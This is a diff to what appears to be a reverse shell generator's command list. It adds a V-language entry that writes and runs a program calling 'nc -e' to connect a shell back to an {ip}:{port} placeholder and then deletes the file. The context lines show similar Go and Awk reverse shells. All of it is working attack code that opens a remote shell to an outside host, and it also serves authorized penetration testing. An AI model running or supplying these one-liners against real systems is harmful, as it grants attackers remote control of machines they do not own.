@@ -304,6 +304,11 @@ const reverseShellCommands = withCommandType(
             "command": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"{shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
             "meta": ["linux", "mac", "windows"]
         },
+	{
+            "name": "Vlang",
+            "command": "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e {shell} {ip} {port} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v",
+            "meta": ["linux", "mac"]
+        },
         {
             "name": "Awk",
             "command": "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
